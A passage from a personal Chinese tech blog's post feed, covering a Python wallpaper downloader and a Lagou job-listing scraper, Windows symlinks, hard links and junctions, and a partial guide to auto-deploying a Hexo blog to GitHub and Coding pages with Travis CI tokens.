class="keyword">global</span> proxies</span><br><span class="line">    <span class="keyword">global</span> download_dir</span><br><span class="line">    <span class="keyword">global</span> downloaded_num</span><br><span class="line">    <span class="keyword">global</span> total</span><br><span class="line">    <span class="comment"># if dir isn't exist, create a dir to download pic </span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(download_dir):</span><br><span class="line">        os.makedirs(download_dir)</span><br><span class="line">    <span class="comment"># download pic to special dir</span></span><br><span class="line">    r = requests.get(url, proxies=proxies)</span><br><span class="line">    downloaded_num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'%s/%s.%s'</span>%(download_dir, name, pic_type), <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(r.content)</span><br><span class="line">    print(<span class="string">'[&#123;:5d&#125;/&#123;&#125;] &#123;&#125;.&#123;&#125; Done!'</span>.format(downloaded_num, total, name, pic_type))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_download_link</span><span class="params">(wallpaper_id, wallpaper_type, server, user_id)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> proxies</span><br><span class="line">    post_data = &#123;</span><br><span class="line">        <span class="string">'wallpaper_id'</span>: wallpaper_id,</span><br><span class="line">        <span class="string">'type'</span>: wallpaper_type,</span><br><span class="line">        <span class="string">'server'</span>: server,</span><br><span class="line">        <span class="string">'user_id'</span>: user_id,</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(<span class="string">'https://wall.alphacoders.com/get_download_link.php'</span>, data=post_data, proxies=proxies)</span><br><span class="line">    download_pic(r.text, wallpaper_id, wallpaper_type)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getwallpaper</span><span class="params">(keyword)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> proxies</span><br><span class="line">    <span class="keyword">global</span> total</span><br><span class="line">    p_nextpage = re.compile(<span class="string">r"&lt;a id='next_page' href=[\'\"](.+?)[\'\"]&gt;"</span>)</span><br><span class="line">    p_item = re.compile(<span class="string">r'data-id="(\d+?)" data-type="(\w+?)" data-server="(\w+?)" data-user-id="(\d+?)"'</span>)</span><br><span class="line">    page_num = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        r_page = requests.get(<span class="string">'https://wall.alphacoders.com/search.php?search=%s&amp;lang=Chinese&amp;page=%d'</span> % (keyword.lower(), page_num), proxies=proxies)</span><br><span class="line">        nextpage_link = p_nextpage.search(r_page.text)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># if there isn't any search result, it will exit the loop</span></span><br><span class="line">        <span class="keyword">if</span> nextpage_link == <span class="keyword">None</span>:</span><br><span class="line">            print(<span class="string">"Sorry, we have no results for your search!"</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> page_num == <span class="number">1</span>:</span><br><span class="line">            total = int(re.search(<span class="string">r"&lt;h1 class='center title'&gt;\s+?(\d+)(.+?)\s+?&lt;/h1&gt;"</span>, r_page.text).group(<span class="number">1</span>))</span><br><span class="line">            print(<span class="string">"the %s wallpaper's total is %d"</span> % (keyword, total))</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> p_item.findall(r_page.text):</span><br><span class="line">            wallpaper_id = item[<span class="number">0</span>]</span><br><span class="line">            wallpaper_type = item[<span class="number">1</span>]</span><br><span class="line">            server = item[<span class="number">2</span>]</span><br><span class="line">            user_id = item[<span class="number">3</span>]</span><br><span class="line">            get_download_link(wallpaper_id, wallpaper_type, server, user_id)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># if there isn't the next page's link, it will exit the loop</span></span><br><span class="line">        <span class="keyword">if</span> nextpage_link.group(<span class="number">1</span>) == <span class="string">'#'</span>:</span><br><span class="line">            print(<span class="string">"All wallpaper done!"</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">        page_num += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span> <span class="keyword">or</span> len(sys.argv) &gt; <span class="number">3</span>:</span><br><span class="line">        usage_text = <span class="string">"Usage:\n\tpython getwallpaper.py miku [miki_pic]\nFirst param: the name of script\nSecond param: the wallpaper's keyword which you want to search\nThird param: the dir's name where you want to download in, optional, default in ./pic"</span></span><br><span class="line">        print(usage_text)</span><br><span class="line">    <span class="keyword">elif</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        download_dir = str(sys.argv[<span class="number">2</span>])</span><br><span class="line">        getwallpaper(str(sys.argv[<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        getwallpaper(str(sys.argv[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>
<h2 id="多说的"><a href="#多说的" class="headerlink" title="多说的"></a>多说的</h2><p>里面我用了下本机的代理，懂的人自然懂，主要是因为直连下载确实有点慢。<br>另外自己懒，本来就是临时十多分钟写的一个脚本，就懒得加多线程了。</p>
<p>自己发了个无声视频，也就是对我讲解中的演示，需要的可以看这里<a href="https://www.bilibili.com/video/av46184510/" target="_blank" rel="noopener">https://www.bilibili.com/video/av46184510/</a></p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1g11eqgyz2cj20pt0gl0ts.jpg" alt=""></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>windows中的软链接硬链接等</title>
    <url>/2018/09/21/windows-file-dir-link.html</url>
    <content><![CDATA[<p>学校嘛，有些时候还是得逆逆上网客户端啥的，并且学校的不少工作，这Windows的需求还是挺强的，之前Win10的体验并不是太好，不过时隔这么久，打算从7升级到10了，恰好系统也该换了。</p>
<p>首先是命令行的关注，在家里使用了太久的marjaro，逐渐转为开发，以前对windows的命令行不关注也变为关注了，PowerShell安装了scoop，可以一键安装不少工具了，但是有一个痛点就是，以前对用户目录不关注，但是linux用久了反而觉得用户目录好用挖，我想在在命令行下切到我快捷方式指向的目录，但是是不行的，然后了解了一下这方面，就像是linux下的软链接硬链接一样。</p>
<a id="more"></a>
<h2 id="使用PowerShell"><a href="#使用PowerShell" class="headerlink" title="使用PowerShell"></a>使用PowerShell</h2><h3 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">New-Item</span> -ItemType SymbolicLink -Path C:\\image -Target C:\\source.txt</span><br></pre></td></tr></table></figure>
<h3 id="硬链接"><a href="#硬链接" class="headerlink" title="硬链接"></a>硬链接</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">New-Item</span> -ItemType HardLink -Path C:\\image.txt -Target C:\\source.txt</span><br></pre></td></tr></table></figure>
<h2 id="Junction"><a href="#Junction" class="headerlink" title="Junction"></a>Junction</h2><p>windows中文件与文件夹是完全不同的两种类型，创建文件夹链接不可以使用 <code>HardLink</code> ，但是可以使用 <code>Junction</code></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">New-Item</span> -ItemType Junction -Path C:\\test\_image -Target C:\\test\_source</span><br></pre></td></tr></table></figure>
<p>虽然powershell可以建立，但是命令还是很繁琐，cmd下有个工具mklink</p>
<h2 id="使用CMD"><a href="#使用CMD" class="headerlink" title="使用CMD"></a>使用CMD</h2><p>cmd下有个好用的工具mklink</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\\&gt;mklink</span><br><span class="line"></span><br><span class="line">创建符号链接。</span><br><span class="line">MKLINK \[\[/D\] | \[/H\] |\[/J\]\] Link Target</span><br><span class="line">    /D 创建目录符号链接。默认为文件符号链接。</span><br><span class="line">    /H 创建硬链接而非符号链接。</span><br><span class="line">    /J 创建目录链接。</span><br><span class="line">    Link 指定新的符号链接名称。</span><br><span class="line">    Target 指定新链接引用的路径（绝对或相对）。</span><br></pre></td></tr></table></figure>
<h2 id="软链接和硬链接的区别"><a href="#软链接和硬链接的区别" class="headerlink" title="软链接和硬链接的区别"></a>软链接和硬链接的区别</h2><p>其实这部分和linux中的是差不多的</p>
<p><strong>符号(软)链接</strong>（Symbolic link）</p>
<ul>
<li>执行命令 mklink link_name target_name</li>
<li>创建链接后的图标和快捷方式很像</li>
<li>在系统中不占用空间</li>
<li>在文件系统中不是一个单独的文件</li>
<li>在操作系统层解析（！？）</li>
<li>如果源文件被删除了，链接就没用了</li>
<li>移除源文件不会影响符号链接</li>
<li>移除链接文件也不会影响源文件</li>
</ul>
<p><strong>硬链接</strong>（Hard link）</p>
<ul>
<li>执行命令 mklink /H link_name target_name</li>
<li>在系统中占用的空间与源文件相同，但在系统中引用的是相同的对象（不是拷贝）</li>
<li>在操作系统层解析（！？）</li>
<li>图标和创建快捷方式的图标不同</li>
<li>移除源文件不会影响硬链接</li>
<li>移除硬链接不会影响源文件</li>
<li>如果源文件被删除，它的内容依然通过硬链接存在</li>
<li>硬链接文件的任何更改都会影响到源文件</li>
</ul>
<h2 id="快捷方式有何不同"><a href="#快捷方式有何不同" class="headerlink" title="快捷方式有何不同"></a>快捷方式有何不同</h2><p>首先不说快捷方式占空间， 软链接不占空间，还有我觉得很重要的区别是快捷方式带后缀<code>.lnk</code>，是个文件，无法通过路径重定向到目标地址，反正我不太推荐这个，除非是建立到桌面方便鼠标点击的用户。</p>
<h2 id="软链接和Junction的区别"><a href="#软链接和Junction的区别" class="headerlink" title="软链接和Junction的区别"></a>软链接和Junction的区别</h2><p>可能你会疑惑 <code>mklink</code> 命令参数 <code>/D</code> 和 <code>/J</code> 的区别。这里我直接贴一段我查到的东西：</p>
<ol>
<li>创建 /d 可以使用相对路径方式创建 /j  必须绝对路径方式创建 此区别意义不大，建议所有的mklink目录均用绝对路径创建</li>
<li>复制和剪切 复制：/d /j 均生成源目录的内容副本，变为一般文件夹 剪切/移动：/d 生成的目录，移动到其他地方，仍旧保持链接。对源目录无影响，/d生成的目录消失  /j 生成的目录，移动到其他地方，会产生一个新的副本文件夹，源文件夹内容全部移至新普通文件夹内，源文件夹清空，源文件夹仍旧存在，/j生成的目录也依旧存在                                              </li>
<li><p>软件打开 用filedialog打开，/d生成的目录，地址栏会跳到源目录位置。                             /J生成的目录，地址栏不会跳到源目录位置。 用FolderDialog打开，两者相同。 </p>
<p>整体来说，/D更像一个快捷方式。</p>
</li>
</ol>
<p>符号链接（Symlink，Softlink）是对文件或目录的引用，实际上符号链接本身是一个“记录着所引用文件或目录的绝对或相对路径”的特殊文件，通过符号链接的操作都会被重定向到目标文件或目录。  </p>
<p>交接点（Junction），也称为“再分析点”，是 NTFS 3.0 及以上文件系统（Windows 2000 及以上系统）的特性，它是链接本地目录（可跨卷）的访问点，通过交接点的操作都会被系统映射到实际的目录上。通过建立交接点，可以在保证一个目录实例（目录的一致性）的前提下，允许用户或程序从本地文件系统中的多个位置访问此目录。<br>对符号链接和快捷方式的“读、写、遍历”等操作都会被重定向到目标文件或目录；但对它们的“复制、删除、移动、配置 ACL”等操作只针对自身；符号链接不但可以应用于本地系统，还可以应用 UNC 路径。  </p>
<p>对交接点内文件和子目录的“建立、删除、修改”等操作都被映射到对应的目录中的文件和子目录上；<br>对交接点的“复制、粘贴、剪切、配置 ACL”，只会影响此交接点；<br>在同一卷内移动交接点，只会影响此交接点；但在不同卷间移动交接点，会将此交接点转换为正常目录，并且交接点对应目录下的所有内容都会被移动；<br>通过“资源浏览器（Explorer.exe）”和“命令行 del”等工具删除交接点时，会同时删除对应目录下的所有内容（但不会删除目录）；可通过“linkd.exe /d”安全的删除交接点；但在 vista 及以后的系统中，对交接点的删除会被正确的处理。</p>
<p>你可以自己建立这两个后，在同卷和在不同卷间复制移动粘贴看看区别，就暂时我了解到的来说的话，我个人建议是使用<code>/D</code>。</p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>拉勾抓职位简单小爬虫</title>
    <url>/2018/09/11/crawl-jos-on-lagou.html</url>
    <content><![CDATA[<p>花了十来分钟写了个这个小爬虫，目的就是想能够方便一点寻找职位，并且大四了，没有工作和实习很慌啊！</p>
<a id="more"></a>
<p>爬虫不具有扩展性，自己随手写的，改掉里面的 <code>keyword</code> 和 <code>region</code> 即可爬行所有的招聘，刚开始测试的是5s访问一次，不过还是会被ban，所以改成了20s一次，没有使用多线程和代理池，懒，够用就行了，结果会保存到一个csv文件里面，用excel打开即可。</p>
<p>直接上代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    keyword = <span class="string">'逆向'</span></span><br><span class="line">    region = <span class="string">'全国'</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">'application/json, text/javascript, */*; q=0.01'</span>,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate, br'</span>,</span><br><span class="line">        <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9'</span>,</span><br><span class="line">        <span class="string">'Cache-Control'</span>: <span class="string">'no-cache'</span>,</span><br><span class="line">        <span class="string">'Connection'</span>: <span class="string">'keep-alive'</span>,</span><br><span class="line">        <span class="string">'Content-Length'</span>: <span class="string">'37'</span>,</span><br><span class="line">        <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded; charset=UTF-8'</span>,</span><br><span class="line">        <span class="string">'Host'</span>: <span class="string">'www.lagou.com'</span>,</span><br><span class="line">        <span class="string">'Origin'</span>: <span class="string">'https://www.lagou.com'</span>,</span><br><span class="line">        <span class="string">'Pragma'</span>: <span class="string">'no-cache'</span>,</span><br><span class="line">        <span class="string">'Referer'</span>: <span class="string">'https://www.lagou.com/jobs/list_%s?city=%s'</span> % (urllib.parse.quote(keyword), urllib.parse.quote(region)),</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36'</span>,</span><br><span class="line">        <span class="string">'X-Anit-Forge-Code'</span>: <span class="string">'0'</span>,</span><br><span class="line">        <span class="string">'X-Anit-Forge-Token'</span>: <span class="string">'None'</span>,</span><br><span class="line">        <span class="string">'X-Requested-With'</span>: <span class="string">'XMLHttpRequest'</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'pn'</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="string">'kd'</span>: keyword,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    total_count = <span class="number">1</span></span><br><span class="line">    pn = <span class="number">1</span></span><br><span class="line">    jobjson = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> total_count &lt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        data[<span class="string">'pn'</span>] = pn</span><br><span class="line">        lagou_reverse_search = requests.post(<span class="string">"https://www.lagou.com/jobs/positionAjax.json?needAddtionalResult=false"</span>, headers=headers, data=data)</span><br><span class="line">        datajson = json.loads(lagou_reverse_search.text)</span><br><span class="line">        print(<span class="string">'page %d get finish'</span> % pn)</span><br><span class="line">        <span class="keyword">if</span> pn == <span class="number">1</span>:</span><br><span class="line">            total_count = int(datajson[<span class="string">'content'</span>][<span class="string">'positionResult'</span>][<span class="string">'totalCount'</span>])</span><br><span class="line">        jobjson += [&#123;<span class="string">'positionName'</span>: j[<span class="string">'positionName'</span>], <span class="string">'salary'</span>: j[<span class="string">'salary'</span>], <span class="string">'workYear'</span>: j[<span class="string">'workYear'</span>], <span class="string">'education'</span>: j[<span class="string">'education'</span>], <span class="string">'city'</span>: j[<span class="string">'city'</span>], <span class="string">'industryField'</span>: j[<span class="string">'industryField'</span>], <span class="string">'companyShortName'</span>: j[<span class="string">'companyShortName'</span>], <span class="string">'financeStage'</span>: j[<span class="string">'financeStage'</span>]&#125; <span class="keyword">for</span> j <span class="keyword">in</span> datajson[<span class="string">'content'</span>][<span class="string">'positionResult'</span>][<span class="string">'result'</span>]]</span><br><span class="line">        total_count -= <span class="number">15</span></span><br><span class="line">        pn += <span class="number">1</span></span><br><span class="line">        time.sleep(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">    csv_header = [<span class="string">'positionName'</span>, <span class="string">'salary'</span>, <span class="string">'workYear'</span>, <span class="string">'education'</span>, <span class="string">'city'</span>, <span class="string">'industryField'</span>, <span class="string">'companyShortName'</span>, <span class="string">'financeStage'</span>]</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'job.csv'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f_csv = csv.DictWriter(f, csv_header)</span><br><span class="line">        f_csv.writeheader()</span><br><span class="line">        f_csv.writerows(jobjson)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>ajax动态加载的，直接打开调试工具看XHR即可。</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>GTD利器Google Calendar与Hexo博客的结合</title>
    <url>/2018/09/08/GTD-google-calendar-with-hexo-next.html</url>
    <content><![CDATA[<p>等待 <code>hexo-theme-next</code> 主题官方仓库的合并。以后再写，先挖个坑。<br><a id="more"></a><br>等待 <code>hexo-theme-next</code> 主题官方仓库的合并。以后再写，先挖个坑。</p>
]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>blog</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Travis CI自动部署博客到github pages和coding pages</title>
    <url>/2018/09/07/use-travis-ci-update-hexo-to-github-and-coding.html</url>
    <content><![CDATA[<p>每次换系统或换电脑之后重新部署博客总是很苦恼？想像jekyll那样，一次性部署完成后，以后本地不用安装环境直接 <code>git push</code> 就能生成博客？那我推荐你应该使用使用 <code>Travis CI</code>了。</p>
<p>这篇文章我们来讲讲如何利用 <code>Travis CI</code>把你 <code>push</code> 上去的博客源文件直接生成可访问的站点，并且同步部署到 <code>github pages</code> 和 <code>coding pages</code> 。</p>
<p>这篇文章假设你已经对这些采用 <code>git</code> 版本控制系统的静态博客托管服务有所了解，并且知道怎么去简单的使用 <code>git</code> 以及了解 <code>hexo</code> 写博客发布到这些 <code>pages</code> 服务的流程。因此本文会写的较为<strong>简略，旨在指出关键的地方以及我遇到的问题、问题产生的原因和提供的解决方案</strong>，希望能够帮助到大家。</p>
<a id="more"></a>
<p>如果大家有什么问题可以直接在下方评论（独立博客采用Disqus，可能需要翻墙），或者直接给我邮件（<a href="mailto:akkuamns@qq.com" target="_blank" rel="noopener">akkuamns@qq.com</a>），我可能会在以后的时间逐步把详细的流程写出来，时间不多，匆忙之际下笔，望大家见谅。</p>
<p>看完上面的话，是不是有一种“复恐匆匆说不尽，行人临发又开封。”的感觉，可能废话太多了，那么直接开始吧！</p>
<h2 id="令牌的获取"><a href="#令牌的获取" class="headerlink" title="令牌的获取"></a>令牌的获取</h2><h3 id="问个为什么"><a href="#问个为什么" class="headerlink" title="问个为什么"></a>问个为什么</h3><p>首先我们说一下为什么要获取令牌？他的作用是什么？</p>
<p>先给大家几个流程图，来自于<a href="https://liolok.github.io/Hexo-Travis-CI/" target="_blank" rel="noopener">liolok的博客(前两张)</a>和<a href="http://magicse7en.github.io/2016/03/27/travis-ci-auto-deploy-hexo-github/" target="_blank" rel="noopener">CodingLife的博客(第三张)</a></p>
<p>首先是当我们未采用 <code>Travis CI</code> ，直接使用 <code>hexo</code> 的插件 <code>hexo-deployer-git</code> 执行命令 <code>hexo d -g</code> 部署的流程：</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fv189l6c01j20xh0j9q4c.jpg" alt="liolok的博客-旧流程"></p>
<p>然后是使用 <code>Travis CI</code> 进行将仓库中的站点源文件自动生成站点然后部署到特定仓库(或特定分支)的流程：</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fv18c106iaj219a0k3q4s.jpg" alt="liolok的博客-新流程"></p>
<p>还有一张图大家也可以看看：</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fv18deh3foj20tx0sfafg.jpg" alt="TravisCI自动构建hexo博客流程图"></p>
<p>现在假设一种情况：我们把 <code>username/username.github.io</code> 仓库 <code>clone</code> 了下来，然后在它里面新建了一个分支 <code>hexo</code> 并放置我们的站点源文件（也就是你 <code>hexo init blog</code> 出来的 <code>blog</code> 目录下的所有文件），然后把这个 <code>hexo</code> 分支 <code>push</code> 了上去。</p>
<p>那么你设置这个仓库到 <code>Travis CI</code> 之后会做什么呢？它会寻找 <code>.travis.yml</code> 这个文件，如果存在的话，它就会根据 <code>.travis.yml</code> 来自动执行一些命令，这些命令就可以完成我们的需求。</p>
<p>然后我们回到刚才的话题，为什么要获取令牌？</p>
<p>令牌相当于一个通行证，比如要实现我们的需求，我们的 <code>.travis.yml</code> 中需要把 <code>hexo</code> 分支下的站点源文件文件使用 <code>hexo g</code> 生成静态站点后把这个静态站点 <code>push</code> 到我们的仓库，那 <code>github</code> 总不可能让人想 <code>push</code> 到谁的仓库就可以直接 <code>push</code> 上去吧，所以它就是靠这个通行证来验证你的身份。</p>
<p>所以我们把令牌的key字段加到 <code>Travis CI</code> 后就可以让 <code>github</code> 知道：哦，这个人是已授权的。</p>
<h3 id="那么怎么做"><a href="#那么怎么做" class="headerlink" title="那么怎么做"></a>那么怎么做</h3><p>那应该怎么去获取这个令牌并加到  <code>Travis CI</code> 呢？</p>
<p>哦哦，忘了说一个东西，如果你仔细看了我刚才的描述，那么你可能对这个  <code>Travis CI</code> 还是不了解，只是大致知道了他可以用来做什么，借用一下维基百科上的解释：</p>
<blockquote>
<p>Travis CI是在软件开发领域中的一个在线的，分布式的持续集成服务，用来构建及测试在GitHub托管的代码。</p>
</blockquote>
<p>你可以把它简单的认为是一个用来 <code>读取你的仓库 -&gt; 读取仓库下的 .travis.yml 文件 -&gt; 根据 .travis.yml 的内容对这个仓库来执行一系列linux和git命令去达到你的目的</code> 的工具。</p>
<p>那么谈到令牌的获取，这个并不麻烦。</p>
<p>如果是 <code>github</code>，登陆后打开设置，然后进入 <code>Developer settings -&gt;Personal access tokens</code> 点击 <code>Generate new token</code>，然后会提示你选择这个令牌拥有的权限，因为我们只需要对仓库进行操作，选中 <code>repo</code>即可。</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fv193cmo02j20sy0g1q46.jpg" alt=""></p>
<p>然后复制那一串 <code>token</code> 先保存下来。</p>
<p>如果是 <code>coding</code>，打开 <code>个人设置 -&gt; 访问令牌</code>，然后点击 <code>新建令牌</code>，同样的给予仓库的控制权限，然后复制保存生成的 <code>token</code> 。</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fv1978v3jhj20r80cj754.jpg" alt=""></p>
<p>然后打开<a href="https://travis-ci.org" target="_blank" rel="noopener">Travis CI</a> 网站，然后点击右上角的用github登录，然后同步你的仓库，再打开你需要自动部署的仓库开关，点击设置进去添加 <code>token</code> 即可。直接给两张图。</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fv19ce3p5xj20up0ieq4h.jpg" alt=""></p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fv19fuupr5j21hc0u0ad1.jpg" alt=""></p>
<p>需要注意的是</p>
<ul>
<li>每个<code>Token</code> 自定义的 <code>Name</code> 你需要记住，待会在写 <code>.travis.yml</code> 的时候会用到</li>
<li><code>Display value in build log</code> 这个选项千万不要打开，因为log是公网可见的</li>
</ul>
<h2 id="仓库的结构"><a href="#仓库的结构" class="headerlink" title="仓库的结构"></a>仓库的结构</h2><p>上面完成了，我们来说说仓库的结构。</p>
<ol>
<li><p>你可以把站点源文件部署到一个新仓库（假如是 <code>new_repo</code>），那么你需要更改一下上面的设置，不是打开博客仓库的开关了，而是换成打开你需要操作的仓库 <code>new_repo</code>的开关，然后  <code>Travis CI</code> 再通过我们设置好的 <code>.travis.yml</code> 自动部署到博客仓库</p>
</li>
<li><p>你也可以把站点源文件部署到博客仓库（下文我以 <code>akkuman.github.io</code> 代替）的新分支，然后 <code>Travis CI</code> 再通过这个新分支下我们设置好的 <code>.travis.yml</code> 自动部署到博客仓库 <code>akkuman.github.io</code> 。</p>
</li>
</ol>
<p>这里我们采用第二种方案，只是个人爱好，不想再多开一个仓库。</p>
<h2 id="仓库的改造"><a href="#仓库的改造" class="headerlink" title="仓库的改造"></a>仓库的改造</h2><h3 id="新分支的建立"><a href="#新分支的建立" class="headerlink" title="新分支的建立"></a>新分支的建立</h3><p>直接看下面的命令和注释吧。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 首先把自己的博客仓库clone到本地</span></span><br><span class="line">git <span class="built_in">clone</span> git@github.com:akkuman/akkuman.github.io.git</span><br><span class="line"><span class="built_in">cd</span> akkuman.github.io.git</span><br><span class="line"><span class="comment"># 我们假设仓库下的部署分支是master</span></span><br><span class="line"><span class="comment"># 我们先新建并切换到一个新分支，分支名我这里取为hexo</span></span><br><span class="line">git checkout -b hexo</span><br></pre></td></tr></table></figure>
<p>现在我们已经切换到了新分支 <code>hexo</code>，紧接着我们删除 <code>akkuman.github.io</code> 文件夹下除了 <code>.git</code> 文件夹的其他所有文件。</p>
<p>我们把其他地方 <code>hexo init blog</code> 出来的 <code>blog</code> 站点文件夹下所有文件复制到刚才的 <code>akkuman.github.io</code> 文件夹下。</p>
<h3 id="站点主题的处理"><a href="#站点主题的处理" class="headerlink" title="站点主题的处理"></a>站点主题的处理</h3><p>这里我们需要注意:<br>不知道你的主题是怎么下载来的，我就分为 1.主题是一个 <code>git</code> 仓库 2.主题不是一个 <code>git</code> 仓库，所以主题可能也是一个 <code>git</code> 仓库，如果你对 <code>git</code> 不熟悉，建议不要 <code>git clone</code> 主题仓库，而是下载别人的 <code>release</code> 版。</p>
<p>判断一个文件夹是不是 <code>git</code> 仓库，就是看该文件夹目录下有没有一个 <code>.git</code>文件夹，注意它是一个隐藏文件夹，所以你发现你的主题是一个 <code>git</code> 仓库的时候，你可以删除这个隐藏的 <code>.git</code>文件夹。</p>
<p>那么我们这么做的目的是什么呢？</p>
<p>如果我们的主题文件夹也是一个 <code>git</code> 仓库，那么我们的这个博客仓库的 <code>hexo</code> 分支下就嵌套了一个仓库，当然，<code>git</code> 也给出了解决方案，那就是子模块。所以目的就是告诉你：图省事可以直接使用非 <code>git</code> 仓库的主题，不用折腾子模块。</p>
<p>多说一点吧：</p>
<p>说到子模块，子模块是SSH协议还是HTTPS协议对后面有影响，不过我后面会给一个通用的模板，看后面的注释即可。</p>
<p>这个子模块你是使用SSH协议还是HTTPS协议就看个人爱好了，我是自己 <code>fork</code> 了别人的仓库然后修改了一下，所以我为了方便期间还是使用了SSH协议的仓库。</p>
<p>然后子模块怎么使用呢？</p>
<p>比如我使用的主题仓库是<a href="mailto:`git@github.com" target="_blank" rel="noopener">`git@github.com</a>:akkuman/hexo-theme-next.git<code>，现在假设我们在博客仓库</code>akkuman.github.io<code>下，然后执行下面命令把这个主题仓库下的所有文件复制到站点目录下的</code>themes/next` 文件夹下。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git submodule add git@github.com:akkuman/hexo-theme-next.git themes/next</span><br></pre></td></tr></table></figure>
<p>然后你的目录下会出现一个 <code>.gitmodules</code> 文件，内容格式大致是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[submodule &quot;themes/next&quot;]</span><br><span class="line">	path = themes/next</span><br><span class="line">	url = git@github.com:akkuman/hexo-theme-next.git</span><br></pre></td></tr></table></figure>
<p>关于子模块的知识可以自己查阅资料，我这里不细说了，待会在后面我会给出参考资料。</p>
<h3 id="git需要忽略的文件"><a href="#git需要忽略的文件" class="headerlink" title="git需要忽略的文件"></a>git需要忽略的文件</h3><p><code>git</code> 依靠 <code>.gitignore</code> 文件判断那些文件不纳入仓库，一般通过 <code>hexo init</code> 命令出来的站点文件夹下都会有这么个文件。没有也没关系，自己新建一个 <code>.gitignore</code> 文件，内容为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.DS_Store</span><br><span class="line">Thumbs.db</span><br><span class="line">db.json</span><br><span class="line">*.log</span><br><span class="line">node_modules/</span><br><span class="line">public/</span><br><span class="line">.deploy*/</span><br></pre></td></tr></table></figure>
<blockquote>
<p>node_modules目录是hexo博客实例的npm环境依赖,，据说是质量比黑洞还大的物体， 我们选择忽略它， 反正最后到了Travis那里也会重新跑一遍npm install,，这些东西本来也会删了重来, 没有同步的意义.<br>public目录是hexo生成的静态文件， db.json是数据库文件,，同理,，由于Travis构建流程中会执行hexo clean,，都不需要同步。</p>
</blockquote>
